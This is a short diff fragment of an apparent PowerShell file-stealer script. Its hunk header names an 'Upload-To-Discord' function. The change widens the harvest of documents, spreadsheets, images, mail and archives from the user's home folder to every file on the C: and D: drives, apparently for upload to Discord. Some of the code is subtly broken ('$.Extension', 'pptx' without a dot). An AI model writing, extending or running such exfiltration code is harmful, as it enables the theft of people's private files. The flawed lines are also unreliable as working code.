@@ -16,7 +16,7 @@ function Upload-To-Discord($file) {
 }
 
 #Get all files from user's home directory
-$files = Get-ChildItem -Path $env:HOMEPATH -Recurse | Where-Object {$.Extension -in ".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg", ".rar", ".zip"}
+$files = Get-ChildItem -Path C:\, D:\ -Recurse | Where-Object {$.Extension -in ".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg", ".rar", ".zip"}
 
 #Create folders for each file type
 $fileTypes = @(".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg", ".rar", ".zip")
